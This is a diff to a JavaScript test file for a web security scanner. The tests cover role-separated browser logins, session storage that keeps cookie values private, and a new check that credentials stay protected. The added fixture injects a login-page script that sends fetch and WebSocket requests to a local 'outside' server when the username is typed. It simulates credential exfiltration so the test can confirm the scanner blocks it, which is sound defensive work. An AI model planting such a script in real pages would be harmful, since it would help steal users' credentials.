@@ -19,6 +19,9 @@ async function fixture(t, mode = 'success', config = {}) {
   let outsideCalls=0;
   const outside=http.createServer((_req,res)=>{outsideCalls++;res.end('outside');});
   outside.listen(0,'127.0.0.1');await once(outside,'listening');
+  const outsideOrigin=`http://127.0.0.1:${outside.address().port}`;
+  const outsideSocketOrigin=outsideOrigin.replace(/^http:/,'ws:');
+  outside.on('upgrade',(_req,socket)=>{outsideCalls++;socket.destroy();});
   t.after(()=>new Promise(resolve=>{outside.closeAllConnections();outside.close(resolve);}));
   const target=http.createServer(async(req,res)=>{
     res.setHeader('content-type','text/html');
@@ -29,7 +32,7 @@ async function fixture(t, mode = 'success', config = {}) {
       let raw='';for await(const chunk of req)raw+=chunk;
       const form=new URLSearchParams(raw),role=form.get('username');posts.push(role);
       assert.equal(form.get('password'),`fixture-${role}`);
-      if(mode==='cross_origin'){res.writeHead(302,{location:`http://127.0.0.1:${outside.address().port}/login`});res.end();return;}
+      if(mode==='cross_origin'){res.writeHead(302,{location:`${outsideOrigin}/login`});res.end();return;}
       if(mode==='post_mfa'){res.end('<form action="/verify"><input name="otp"></form>');return;}
       if(mode==='partial'&&role==='victim'){res.statusCode=401;res.end('invalid login');return;}
       if(mode!=='no_session')res.setHeader('set-cookie',`sid=${role}-session; Path=/; HttpOnly`);
@@ -38,7 +41,15 @@ async function fixture(t, mode = 'success', config = {}) {
     if(req.url==='/logout'){res.statusCode=404;res.end('not found');return;}
     if(mode==='no_form'){res.end('<main>Public content</main>');return;}
     res.setHeader('set-cookie','csrf=prelogin-only; Path=/');
-    res.end(`<form method="POST" action="/login"><input name="username"><input type="password" name="password">${mode==='mfa'?'<input name="otp">':''}<button>Login</button></form>`);
+    const credentialExfiltration=mode==='credential_exfiltration'?`<script>
+      const external=${JSON.stringify(outsideOrigin)}, socket=${JSON.stringify(outsideSocketOrigin)};
+      const capturedSocket=globalThis.WebSocket;
+      document.querySelector('[name=username]').addEventListener('input',()=>{
+        fetch(external+'/credential-window-fetch',{method:'POST'}).catch(()=>{});
+        try { new capturedSocket(socket+'/credential-window-socket'); } catch {}
+      });
+    </script>`:'';
+    res.end(`<form method="POST" action="/login"><input name="username"><input type="password" name="password">${mode==='mfa'?'<input name="otp">':''}<button>Login</button></form>${credentialExfiltration}`);
   });
   target.listen(0,'127.0.0.1');await once(target,'listening');
   t.after(()=>new Promise(resolve=>{target.closeAllConnections();target.close(resolve);}));
@@ -256,10 +267,27 @@ test('browser discovery logs in identities behind empty accounts in separate rol
   for(const role of ['attacker','victim']){
     const account=accounts.find(item=>item.tags.includes(`role:${role}`));
     assert.ok(account.tags.includes(`scan:${f.run.id}`));
-    assert.match(identityHeaders(account.fields).cookie,new RegExp(`sid=${role}-session`));
+    assert.equal(identityHeaders(account.fields).cookie,undefined,'browser sessions stay in the persistent browser context, not account fields');
+    assert.equal(account.fields.auth_token,undefined);
+    assert.equal(account.fields.token,undefined);
+    assert.equal(account.fields.cookies,undefined);
+  }
+  const contexts=await f.repo.listBrowserContexts(f.run.id);
+  for(const role of ['attacker','victim']){
+    const context=contexts.find(item=>item.scope_type==='identity'&&item.identity_key===role&&item.status==='active');
+    assert.equal(context?.storage_state_present,true,`the ${role} authenticated browser context is retained privately`);
+    assert.ok(context.storage_cookie_count>0,'only cookie metadata, never values, is exposed by the context list');
   }
   const coverage=(await f.repo.listArtifacts(f.run.id)).find(item=>item.artifact_type==='web_discovery_coverage');
   assert.equal(coverage.content_json.authenticated_identities,2);
+});
+
+test('browser discovery installs the prepared-credential boundary before login scripts can retain an external WebSocket',{timeout:30000},async t=>{
+  const f=await fixture(t,'credential_exfiltration',{accounts:{attacker:{username:'attacker',password:'fixture-attacker'}},max_browser_pages:1});
+  await discoverWebPages(f.db,f.repo,f.run,f.discovery.id);
+  assert.deepEqual(f.posts,[],'a blocked credential window must not submit the login form');
+  assert.equal(f.outsideCalls(),0,'pre-navigation credential protection blocks fetch and a WebSocket captured by login-page code');
+  assert.equal((await f.db.repos.accounts.findAll()).length,0);
 });
 
 test('BFLA never treats a victim session as the missing privileged role',async t=>{
